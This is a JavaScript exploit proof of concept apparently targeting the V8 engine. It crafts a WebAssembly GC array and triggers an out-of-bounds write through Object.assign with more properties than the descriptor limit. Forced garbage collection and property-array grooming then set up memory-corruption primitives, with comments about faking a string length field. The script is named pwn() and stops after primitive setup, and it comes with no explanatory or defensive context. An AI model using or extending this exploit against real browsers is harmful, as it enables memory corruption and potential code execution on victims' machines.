function gc_minor() { //scavenge
    for(let i = 0; i < 1000; i++) {
        new ArrayBuffer(0x10000);
    }
}

function gc_major() { //mark-sweep
    new ArrayBuffer(0x7FE00000);
}

let wasm_bytecode = new Uint8Array([
    0, 97, 115, 109, 1, 0, 0, 0, 1, 12, 2, 80, 0, 94, 127, 1, 96, 1, 127, 1, 100, 0, 3, 2,
    1, 1, 7, 16, 1, 12, 99, 114, 101, 97, 116, 101, 95, 97, 114, 114, 97, 121, 0, 0, 10, 9,
    1, 7, 0, 32, 0, 251, 7, 0, 11, 0, 22, 4, 110, 97, 109, 101, 1, 15, 1, 0, 12, 99, 114,
    101, 97, 116, 101, 95, 97, 114, 114, 97, 121
]);

let wasm_module = new WebAssembly.Module(wasm_bytecode);
let wasm_instance = new WebAssembly.Instance(wasm_module);

let wasm = wasm_instance.exports;

const kDescriptorIndexBitCount = 10;
const kMaxNumberOfDescriptors = (1 << kDescriptorIndexBitCount) - 4; //1020

function install_primitives() {
    let src = {};
    for(let i = 0; i < (kMaxNumberOfDescriptors+1); i++) {
        src[`p${i}`] = 1;
    }
    //stops us from crashing in SetOrCopyDataProperties
    src.__defineGetter__("p0", function() {
        throw new Error("bailout");
    });
    //need to create the map beforehand to avoid descriptor arrays being allocated 
    //innapropriately
    let dummy = {};
    dummy.i1 = 0;
    dummy.i2 = 0;
    dummy.i3 = 0;
    dummy.i4 = 0;
    for(let i = 1; i <= 16; i++) {
        dummy[`p${i}`] = 0;
    }

    var o = {};
    //inline properties
    o.i1 = 0;
    o.i2 = 0;
    o.i3 = 0;
    o.i4 = 0;

    //external properties
    o.p1 = 0; //fake SeqTwoByteString length field
    for(let i = 2; i <= 15; i++) {
        o[`p${i}`] = 0;
    }
    let wasm_array = wasm.create_array(0);
    o.p16 = 0; //reallocates new property array twice as large
    
    var arr1 = [1.1];//, 1.1, 1.1, 1.1];
    var arr2 = [{}];

    // %DebugPrint(wasm_array);
    // %DebugPrint(o);

    try {
        //trigger 1 element OOB zero write
        Object.assign(wasm_array, src);
    } catch(err) {}
    
    gc_major();
    // %DebugPrint(wasm_array);
    o.p9 = 1024;
    o.p11 = 1024;

    console.log(o);
    //%DebugPrint(o); //will crash

    // %DebugPrint(arr1);
}

function pwn() {
    install_primitives();
}

pwn();

// alert("Working...");

